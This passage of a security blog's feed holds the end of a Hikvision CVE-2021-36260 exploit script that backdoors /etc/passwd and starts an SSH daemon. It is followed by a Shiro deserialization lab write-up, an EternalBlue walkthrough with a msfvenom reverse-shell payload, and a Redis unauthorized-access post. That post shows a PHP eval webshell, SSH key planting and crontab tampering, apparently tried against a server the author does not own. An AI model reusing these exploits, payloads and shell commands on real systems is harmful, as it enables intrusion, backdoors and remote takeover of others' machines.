+        <span class="k">if</span> <span class="n">data</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">401</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">headers</span><span class="p">)</span>
+            <span class="nf">print</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+            <span class="k">return</span> <span class="bp">False</span>
+        <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">query_args</span><span class="o">=</span><span class="sh">'</span><span class="s">echo :/:/bin/sh&gt;&gt;N</span><span class="sh">'</span><span class="p">)</span>
+        <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">query_args</span><span class="o">=</span><span class="sh">'</span><span class="s">cat N&gt;&gt;/etc/passwd</span><span class="sh">'</span><span class="p">)</span>
+        <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">query_args</span><span class="o">=</span><span class="sh">'</span><span class="s">dropbear -R -B -p 1337</span><span class="sh">'</span><span class="p">)</span>
+        <span class="n">remote</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">query_args</span><span class="o">=</span><span class="sh">'</span><span class="s">cat N&gt;webLib/N</span><span class="sh">'</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[i] Remote </span><span class="sh">"</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="sh">"</span><span class="s"> already pwned</span><span class="sh">'</span><span class="p">)</span>
+
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[*] Trying SSH to </span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="s"> on port 1337</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">stty echo; stty iexten; stty icanon; </span><span class="se">\
+</span><span class="s">    ssh -o StrictHostKeyChecking=no -o LogLevel=error -o UserKnownHostsFile=/dev/null </span><span class="se">\
+</span><span class="s">    P@</span><span class="si">{</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="si">}</span><span class="s"> -p 1337</span><span class="sh">'</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[*] Hikvision CVE-2021-36260</span><span class="se">\n</span><span class="s">[*] PoC by bashis &lt;mcw noemail eu&gt; (2021)</span><span class="sh">'</span><span class="p">)</span>
+
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="nc">ArgumentParser</span><span class="p">()</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--rhost</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Remote Target Address (IP/FQDN)</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--rport</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">80</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Remote Target Port</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--check</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="sh">'</span><span class="s">store_true</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Check if vulnerable</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--reboot</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="sh">'</span><span class="s">store_true</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Reboot if vulnerable</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--shell</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="sh">'</span><span class="s">store_true</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Launch SSH shell</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--cmd</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">execute cmd (i.e: </span><span class="sh">"</span><span class="s">ls -l</span><span class="sh">"</span><span class="s">)</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">--cmd_blind</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">execute blind cmd (i.e: </span><span class="sh">"</span><span class="s">reboot</span><span class="sh">"</span><span class="s">)</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span>
+        <span class="sh">'</span><span class="s">--noverify</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="sh">'</span><span class="s">store_true</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Do not verify if vulnerable</span><span class="sh">'</span>
+    <span class="p">)</span>
+    <span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span>
+        <span class="sh">'</span><span class="s">--proto</span><span class="sh">'</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">choices</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">http</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">https</span><span class="sh">'</span><span class="p">],</span> <span class="n">default</span><span class="o">=</span><span class="sh">'</span><span class="s">http</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">Protocol used</span><span class="sh">'</span>
+    <span class="p">)</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
+
+    <span class="n">remote</span> <span class="o">=</span> <span class="nc">Http</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">rhost</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">rport</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">proto</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">shell</span><span class="p">:</span>
+            <span class="nf">shell</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span>
+        <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">cmd</span><span class="p">:</span>
+            <span class="nf">cmd</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span>
+        <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">cmd_blind</span><span class="p">:</span>
+            <span class="nf">cmd_blind</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span>
+        <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">check</span><span class="p">:</span>
+            <span class="nf">check</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span>
+        <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">reboot</span><span class="p">:</span>
+            <span class="nf">check_reboot</span><span class="p">(</span><span class="n">remote</span><span class="p">,</span> <span class="n">args</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">([</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">])</span>
+    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">False</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
+    <span class="nf">main</span><span class="p">()</span>
+</code></pre></div></div>]]></content><author><name>yueyejian</name></author><category term="vul" /><category term="hikvision" /><category term="unserialize" /><summary type="html"><![CDATA[body=”laCurrentLanguage” &amp;&amp; country=”CN”]]></summary></entry><entry><title type="html">CVE-2016-4437 - Shiro反序列化</title><link href="http://localhost:4000/vulhub/CVE-2016-4437/" rel="alternate" type="text/html" title="CVE-2016-4437 - Shiro反序列化" /><published>2022-04-20T00:00:00+08:00</published><updated>2022-04-20T00:00:00+08:00</updated><id>http://localhost:4000/vulhub/CVE-2016-4437</id><content type="html" xml:base="http://localhost:4000/vulhub/CVE-2016-4437/"><![CDATA[<h1 id="cve-2016-4437---shiro反序列化">CVE-2016-4437 - Shiro反序列化</h1>
+<h2 id="0x00-漏洞概述">0x00 漏洞概述</h2>
+<p>Apache Shiro是一款开源的java安全框架，执行身份验证、授权、密码和会话管理。
+Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为rememberMe的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>
+
+<h2 id="0x01-影响范围">0x01 影响范围</h2>
+
+<p><strong>Apache Shiro &lt;=1.2.4</strong></p>
+
+<h2 id="0x02-环境搭建">0x02 环境搭建</h2>
+<p>使用vulhub搭建环境</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker-compose up -d
+</code></pre></div></div>
+<p><img src="/images/vulhub/CVE-2016-4437/0.jpg" alt="" /></p>
+
+<h2 id="0x03-漏洞原理">0x03 漏洞原理</h2>
+<p>Shiro的身份认证工作流程：</p>
+
+<p>通过前端传入的值–&gt;获取remenberMe cookie–&gt;base64加密–&gt;AES加密–&gt;反序列化</p>
+
+<p>以上流程中AES加密的密钥存在padding oracle攻击及密钥泄露。因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞</p>
+
+<h2 id="0x04-漏洞检测">0x04 漏洞检测</h2>
+
+<p>尝试登录，登录的返回包中有<strong>rememberMe=deleteMe</strong>字段</p>
+
+<p><img src="/images/vulhub/CVE-2016-4437/1.jpg" alt="" /></p>
+
+<p>或者不登录，发送一个GET请求登录页面的包，把cookie改成rememberMe=1，返回包中也存在<strong>rememberMe=deleteMe</strong>字段</p>
+
+<p><img src="/images/vulhub/CVE-2016-4437/2.jpg" alt="" /></p>
+
+<p>则可判断使用了shiro框架，接下来使用工具ShiroExploit 检测是否存在shiro反序列化漏洞</p>
+
+<p>https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51</p>
+
+<p><img src="/images/vulhub/CVE-2016-4437/3.jpg" alt="" /></p>
+
+<p>当命令框可输入，代表存在漏洞</p>
+
+<p><img src="/images/vulhub/CVE-2016-4437/4.jpg" alt="" /></p>
+
+<p>可以勾选便捷操作，反弹shell，输入攻击机的ip和端口号，并在攻击机监听端口，可成功获取目标shell</p>
+
+<p><img src="/images/vulhub/CVE-2016-4437/5.jpg" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="vulhub" /><category term="shiro" /><category term="unserialize" /><category term="web" /><summary type="html"><![CDATA[CVE-2016-4437 - Shiro反序列化 0x00 漏洞概述 Apache Shiro是一款开源的java安全框架，执行身份验证、授权、密码和会话管理。 Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为rememberMe的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。]]></summary></entry><entry><title type="html">MS17-010 - 永恒之蓝</title><link href="http://localhost:4000/vul/ms17-010/" rel="alternate" type="text/html" title="MS17-010 - 永恒之蓝" /><published>2022-04-20T00:00:00+08:00</published><updated>2022-04-20T00:00:00+08:00</updated><id>http://localhost:4000/vul/ms17-010</id><content type="html" xml:base="http://localhost:4000/vul/ms17-010/"><![CDATA[<h1 id="ms17-010---永恒之蓝">MS17-010 - 永恒之蓝</h1>
+<h2 id="0x00-漏洞概述">0x00 漏洞概述</h2>
+<p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
+
+<h2 id="0x01-影响版本">0x01 影响版本</h2>
+<p>WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0</p>
+
+<h2 id="0x02-环境搭建">0x02 环境搭建</h2>
+<p>靶机winXP（关闭防火墙） 192.168.32.131</p>
+
+<p>攻击机kali   192.168.32.128</p>
+
+<h2 id="0x03-漏洞检测">0x03 漏洞检测</h2>
+<p>通过nmap的扫描可以看到445端口是开着的，永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞</p>
+
+<p><img src="/images/vul/ms17-010/0.jpg" alt="" /></p>
+
+<p>打开msf，搜索ms17-010</p>
+
+<p><img src="/images/vul/ms17-010/1.jpg" alt="" /></p>
+
+<p>选中auxiliary/scanner/smb/smb_ms17_010这个模块，扫描C断存在漏洞的主机</p>
+
+<p>用到的命令：</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfconsole
+$ search ms17-101
+$ use 1
+$ show options
+$ set rhost 192.168.32.0/24
+$ run
+</code></pre></div></div>
+<p>结果显示靶机存在漏洞</p>
+
+<p><img src="/images/vul/ms17-010/2.jpg" alt="" /></p>
+
+<h2 id="0x04-漏洞利用">0x04 漏洞利用</h2>
+<p>但是kali自带的永恒之蓝攻击模块是针对64位系统的，而我的靶机如上图所见是32位的。然后我就自闭了，试了msf上面不同的攻击模块和不同的payload，还是获取不到shell，也参考了网上其他大佬的文章，但是看不太懂。。最后去外网搜参考了一位外国友人的文章，碰巧的是他遇到的问题和我的一模一样，于是按照这个方法成功获得了shell。</p>
+
+<p><a href="https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3">Exploiting-ms17-010-without-metasploit-win-xp-sp3</a></p>
+
+<p>首先先下载好下面这个exploit，在这个脚本的描述里，以下windows版本都适用</p>
+
+<p>https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tested on:
+- Windows 2016 x64
+- Windows 10 Pro Build 10240 x64
+- Windows 2012 R2 x64
+- Windows 8.1 x64
+- Windows 2008 R2 SP1 x64
+- Windows 7 SP1 x64
+- Windows 2008 SP1 x64
+- Windows 2003 R2 SP2 x64
+- Windows XP SP2 x64
+- Windows 8.1 x86
+- Windows 7 SP1 x86
+- Windows 2008 SP1 x86
+- Windows 2003 SP2 x86
+- Windows XP SP3 x86
+- Windows 2000 SP4 x86
+</code></pre></div></div>
+
+<p>然后用msf生成一个用来弹shell的可执行程序</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.32.128 LPORT=2333 -f exe -a x86 --platform windows -o ms17-010.exe
+</code></pre></div></div>
+
+<p>最后还需要一个mysmb.py ，不然会报错</p>
+
+<p>https://github.com/worawit/MS17-010/blob/master/mysmb.py</p>
+
+<p>把这三样东西放在kali中的同一个目录，提前监听2333端口，执行以下命令就可以了</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python send_and_execute.py 192.168.32.131 ms17-010.exe
+
+</code></pre></div></div>
+
+<p><img src="/images/vul/ms17-010/3.jpg" alt="" /></p>]]></content><author><name>yueyejian</name></author><category term="vul" /><category term="windows" /><category term="smb" /><category term="msf" /><summary type="html"><![CDATA[MS17-010 - 永恒之蓝 0x00 漏洞概述 Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。]]></summary></entry><entry><title type="html">Redis未授权访问实战</title><link href="http://localhost:4000/vul/Redis/" rel="alternate" type="text/html" title="Redis未授权访问实战" /><published>2022-04-13T00:00:00+08:00</published><updated>2022-04-13T00:00:00+08:00</updated><id>http://localhost:4000/vul/Redis</id><content type="html" xml:base="http://localhost:4000/vul/Redis/"><![CDATA[<h1 id="redis未授权访问实战">Redis未授权访问实战</h1>
+<h2 id="0x00-前言">0x00 前言</h2>
+<p>最近偶然挖到一个Redis未授权访问漏洞，但是对Redis和漏洞原理不了解，所以一边写一边学一下这个漏洞。尝试一下getshell。</p>
+
+<h2 id="0x01-redis简介">0x01 Redis简介</h2>
+<p>简单来说，Redis是一种数据库。
+Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p>
+
+<p>Redis和mysql的区别：
+https://www.hzpady.com/a/2119.html</p>
+
+<h2 id="0x02-漏洞原理产生条件">0x02 漏洞原理（产生条件）</h2>
+<p>redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。
+没有设置密码认证，可以免密码登入redis服务。</p>
+
+<h2 id="0x03-漏洞利用">0x03 漏洞利用</h2>
+<h3 id="方法1-利用redis写webshell条件是知道web目录的绝对路径并有读写权限">方法1 利用redis写webshell（条件是知道web目录的绝对路径，并有读写权限）</h3>
+
+<p>先下载个Redis</p>
+
+<p><img src="/images/vul/redis/0.jpg" alt="" /></p>
+
+<p>在redis官网上看到可以docker pull，那岂不乐哉。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker search redis
+$ docker pull redis
+</code></pre></div></div>
+
+<p>只需两条命令，redis已成为我的囊中之物</p>
+
+<p><img src="/images/vul/redis/1.jpg" alt="" /></p>
+
+<p>接下来运行容器</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker run -d -p 6379:6379 --name redis redis
+</code></pre></div></div>
+<p>用ps命令可以看到redis已经部署到了我的6379端口了</p>
+
+<p><img src="/images/vul/redis/2.jpg" alt="" /></p>
+
+<p>刚刚学了Redis未授权访问漏洞，那我自己不会也可以被x了吧？于是我扫了一下自己，并没有发现6379端口开放，那我应该还是安全的。而且好像如果被x了，x的应该也是我的docker容器才对！</p>
+
+<p><img src="/images/vul/redis/3.jpg" alt="" /></p>
+
+<p>下一步进入容器</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker exec -it redis /bin/bash
+</code></pre></div></div>
+<p>在容器里用 <code class="language-plaintext highlighter-rouge">redis-cli -h xxx.xxx.xxx.xxx </code>命令来连接存在漏洞的服务器</p>
+
+<p><img src="/images/vul/redis/4.jpg" alt="" /></p>
+
+<p>连接成功后的一些常用命令：</p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">查看信息：info</span>
+<span class="s">删除所有数据库内容：flushall</span>
+<span class="s">刷新数据库：flushdb</span>
+<span class="s">查看所有键：KEYS *，使用select num可以查看键值数据</span>
+<span class="s">设置变量：set test "whoami"</span>
+<span class="s">设置路径等配置：config set dir [dirpath]</span>
+<span class="s">获取路径及数据配置信息：config get dir/dbfilename</span>
+<span class="s">获取所有配置信息：config get *</span>
+<span class="s">保存：save</span>
+<span class="s">查看变量名称：get [变量]</span>
+</code></pre></div></div>
+
+<p>开始写webshell了，方法是</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">config</span> <span class="k">set</span> <span class="n">dir</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span> 
+<span class="n">config</span> <span class="k">set</span>  <span class="n">dbfilename</span> <span class="n">shell</span><span class="p">.</span><span class="n">php</span> 
+<span class="k">set</span> <span class="n">x</span> <span class="nv">"&lt;?php eval($_POST[cmd]);?&gt;"</span> 
+<span class="n">save</span>
+</code></pre></div></div>
+
+<p><strong>发现找不到网站的绝对路径</strong>，试了很多也没用，看来只能另辟蹊径了</p>
+
+<h3 id="方法2-在目标机器写入ssh公钥-然后在用私钥登录前提是开启了ssh服务即22号端口开放目标机器root权限启动redis">方法2 在目标机器写入ssh公钥 然后在用私钥登录（前提是开启了ssh服务即22号端口开放，目标机器root权限启动redis）</h3>
+
+<p><img src="/images/vul/redis/5.jpg" alt="" /></p>
+
+<p><img src="/images/vul/redis/6.jpg" alt="" /></p>
+
+<p>再把key.txt导入容器</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker cp ./key.txt redis:/home
+</code></pre></div></div>
+
+<p>进入容器，如图操作发现没有权限，很遗憾，但是说明此方法也不可行了。</p>
+
+<p><img src="/images/vul/redis/7.jpg" alt="" /></p>
+
+<p>如果有权限的话就可以</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     <span class="o">&gt;</span> <span class="n">config</span> <span class="k">set</span> <span class="n">dir</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span>
+     <span class="o">&gt;</span> <span class="n">config</span> <span class="k">get</span> <span class="n">dir</span>
+     <span class="o">&gt;</span> <span class="n">config</span> <span class="k">set</span> <span class="n">dbfilename</span> <span class="nv">"authorized_keys"</span>
+     <span class="o">&gt;</span> <span class="n">save</span>
+
+<span class="n">ssh</span> <span class="o">-</span><span class="n">i</span> <span class="n">a</span> <span class="n">root</span><span class="o">@</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span>     
+</code></pre></div></div>
+
+<p>或者如下</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="o">&gt;</span> <span class="n">config</span> <span class="k">set</span> <span class="n">dir</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span>
+      <span class="o">&gt;</span> <span class="n">config</span> <span class="k">set</span> <span class="n">dbfilename</span> <span class="n">authorized_keys</span>
+      <span class="o">&gt;</span> <span class="k">set</span> <span class="n">x</span> <span class="nv">"</span><span class="se">\n\n\n</span><span class="nv">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC87XDbro8GLpOd4CLvm4uEkyeHAg5qElanEaiYIVh19fo6DvEYHjvUJ6+xg86wXSqbO9YPBvW+ZBFEDwq2ywVOL0jxrQ26GdQwY4SSfvrKdPKUVLvoV5+haZ6wc9ECK0P5rVuVuljWYTh+T5TCubEdXa5QKWNf+lGqDED6unUg4RuvI+1+LAWPrSTMGuYazHYC5GMVp/Y/eA9jrbEH3BZyYLLdsYB4yBw3Ej6hezpFjIJsOJaTx9PlO2rce7VJjCZkCRu5eqLkSqyEFEyD2UNVPQ21oIzaVg4rShMij1r6R8CMpc6mysbOEcEsCBLNZxN3EfwGOwtSYa8LV3d0mHXn ubuntu@VM-20-16-ubuntu</span><span class="se">\n\n\n</span><span class="nv">"</span>
+      <span class="o">&gt;</span> <span class="n">save</span>
+</code></pre></div></div>
+
+<h3 id="方法3-修改目标机器的crontab-添加弹shell命令">方法3 修改目标机器的crontab 添加弹shell命令</h3>
+
+<ul>
+  <li><a href="/linux-tricks/crontab/">Linux - Crontab</a></li>
+</ul>
+
+<p>很可惜在目标机器中没有找到 /var/spool/cron 文件夹</p>
+
+<p>如果写到/etc/crontab文件中能否利用成功呢？到处都是知识盲区，还是得自己搭环境慢慢试。</p>
+
+<h2 id="0x04-小结">0x04 小结</h2>
+<p>我感觉这个漏洞算是挺常见的，经常能在其他文章中看到，今天自己也挖到了，于是就简单学习了一波。这算是很古老的漏洞了吧，但是在今天仍然随处可见，正说明了人类的不良习惯造成的漏洞是没办法打补丁的。</p>
+
+<p>参考文章（里面防护方法也很详细）
+https://www.freebuf.com/articles/network/170904.html</p>]]></content><author><name>yueyejian</name></author><category term="vul" /><category term="redis" /><category term="unauthorized" /><category term="linux" /><category term="ssh" /><summary type="html"><![CDATA[Redis未授权访问实战 0x00 前言 最近偶然挖到一个Redis未授权访问漏洞，但是对Redis和漏洞原理不了解，所以一边写一边学一下这个漏洞。尝试一下getshell。]]></summary></entry></feed>
